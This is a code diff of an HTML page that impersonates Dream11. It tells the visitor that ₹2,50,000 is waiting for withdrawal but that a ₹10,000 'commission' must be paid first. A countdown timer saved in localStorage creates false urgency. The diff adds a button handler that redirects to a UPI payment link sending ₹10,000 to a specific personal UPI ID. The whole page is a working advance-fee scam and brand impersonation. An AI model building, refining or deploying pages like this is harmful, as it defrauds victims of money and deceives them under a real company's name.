@@ -6,128 +6,107 @@
   <title>Withdrawal Page</title>
   <style>
     body {
+      background-color: #e53935;
+      font-family: 'Segoe UI', sans-serif;
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #d80000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      padding: 0;
     }
-
     .container {
-      background-color: white;
-      border-radius: 25px;
-      padding: 30px 20px;
-      width: 90%;
       max-width: 400px;
+      background: white;
+      margin: 100px auto;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
       text-align: center;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
     }
-
     .logo {
       width: 80px;
       margin-bottom: 10px;
     }
-
-    .brand {
-      color: #d80000;
+    .title {
+      color: #d32f2f;
       font-weight: bold;
       font-size: 20px;
-      margin-bottom: 10px;
     }
-
-    h2 {
-      margin: 10px 0;
-    }
-
     .amount {
-      font-size: 28px;
-      font-weight: bold;
       color: green;
+      font-size: 32px;
+      margin: 10px 0;
+      font-weight: bold;
     }
-
-    .info {
-      font-size: 15px;
+    .timer {
+      color: red;
+      font-weight: bold;
       margin: 15px 0;
     }
-
-    .timer {
-      font-weight: bold;
-      color: red;
-      margin-top: 10px;
-      font-size: 16px;
-    }
-
     .btn {
-      margin-top: 20px;
-      padding: 12px 20px;
-      background-color: #28a745;
+      background-color: green;
       color: white;
+      padding: 14px 20px;
       border: none;
-      border-radius: 12px;
       font-size: 16px;
+      border-radius: 10px;
       cursor: pointer;
     }
-
-    .btn:hover {
-      background-color: #218838;
-    }
-
-    .expired {
-      font-size: 18px;
-      font-weight: bold;
-      color: red;
-      margin-top: 20px;
+    .btn:disabled {
+      background: gray;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="1000076818.png" alt="Dream11 Logo" class="logo" />
-    <div class="brand">DREAM11</div>
+    <img src="dream11-logo.png" alt="Dream11 Logo" class="logo" />
+    <div class="title">DREAM11</div>
     <h2>Withdrawal Page</h2>
     <p>Your withdrawal amount is:</p>
-    <p class="amount">₹2,50,000</p>
-    <p class="info">You must pay ₹10,000 commission to proceed with withdrawal.</p>
+    <div class="amount">₹2,50,000</div>
+    <p>You must pay ₹10,000 commission to proceed with withdrawal.</p>
     <div class="timer" id="countdown">Time left: 12:00:00</div>
     <button class="btn" id="withdrawBtn">Withdraw Now</button>
-    <div class="expired" id="expiredMsg" style="display:none;">Link Expired</div>
   </div>
 
   <script>
-    const countdownElement = document.getElementById("countdown");
+    const countdownEl = document.getElementById("countdown");
     const withdrawBtn = document.getElementById("withdrawBtn");
-    const expiredMsg = document.getElementById("expiredMsg");
 
-    function startCountdown(duration) {
-      let endTime = localStorage.getItem("withdrawalExpiry");
-      if (!endTime) {
-        endTime = Date.now() + duration;
-        localStorage.setItem("withdrawalExpiry", endTime);
-      }
+    const twelveHours = 12 * 60 * 60 * 1000;
+    const storageKey = "withdrawalStartTime";
 
-      const interval = setInterval(() => {
-        const now = Date.now();
-        const distance = endTime - now;
+    function startTimer(startTime) {
+      const timerInterval = setInterval(() => {
+        const now = new Date().getTime();
+        const distance = startTime + twelveHours - now;
 
         if (distance <= 0) {
-          clearInterval(interval);
-          countdownElement.style.display = "none";
-          withdrawBtn.style.display = "none";
-          expiredMsg.style.display = "block";
-          return;
+          clearInterval(timerInterval);
+          countdownEl.innerText = "Link Expired";
+          withdrawBtn.disabled = true;
+          withdrawBtn.innerText = "Link Expired";
+        } else {
+          const hrs = String(Math.floor((distance / (1000 * 60 * 60)))).padStart(2, '0');
+          const mins = String(Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, '0');
+          const secs = String(Math.floor((distance % (1000 * 60)) / 1000)).padStart(2, '0');
+          countdownEl.innerText = `Time left: ${hrs}:${mins}:${secs}`;
         }
-
-        const hours = String(Math.floor(distance / (1000 * 60 * 60))).padStart(2, "0");
-        const minutes = String(Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, "0");
-        const seconds = String(Math.floor((distance % (1000 * 60)) / 1000)).padStart(2, "0");
-
-        countdownElement.textContent = `Time left: ${hours}:${minutes}:${seconds}`;
       }, 1000);
     }
 
-    startCountdown(12 * 60 * 60 * 1000); // 12 hours
+    // Start time logic
+    let startTime = localStorage.getItem(storageKey);
+    if (!startTime) {
+      startTime = new Date().getTime();
+      localStorage.setItem(storageKey, startTime);
+    } else {
+      startTime = parseInt(startTime);
+    }
+    startTimer(startTime);
+
+    // Payment redirect
+    withdrawBtn.addEventListener("click", () => {
+      const upiURL = "upi://pay?pa=6005973034@ybl&pn=Dream11%20Commission&am=10000";
+      window.location.href = upiURL;
+    });
   </script>
 </body>
 </html>
